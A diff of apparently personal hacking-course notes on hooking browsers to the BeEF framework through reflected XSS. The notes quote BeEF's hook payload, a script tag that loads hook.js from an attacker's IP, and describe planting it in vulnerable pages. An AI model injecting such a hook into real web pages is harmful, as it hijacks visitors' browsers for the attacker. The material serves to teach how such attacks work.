@@ -807,10 +807,11 @@ Step 6 -> Hooking victims to BeEF Using Reflected XSS Screenshot(480)
 Beef Framework allows us to run large no. of commands to hook browsers and to hook a browser to beef a javascript code has to be
 executed on that browser and bcz beef uses JS it's very easy for us to inject that code into XSS vulnerable web pages and that code
 will be executed every time a person runs that page
-- go to kali linux desktop and run beef, it will automatically start browser for u
+- go to kali linux desktop and run beef, it will automatically start browser for u or try run cmd -> beef-xss
 - on the left side u will see folder of Online browsers which contains all the browsers which are currently hooked to beef //
 currently their is no browser hooked
- - their r no. of ways that u can use to hook people to beef but currently we will look into XSS vulnerabilities
+ - their r no. of ways that u can use to hook people to 
+ but currently we will look into XSS vulnerabilities
  - we will currently use the code given to us by beef itself which much similar to alert code we were using as u can see it in the
  beef opened terminal like this ->
  Hook: <script src="http://<IP>:3000/hook.js"></script>, copy it and modify it with ur own IP lik this
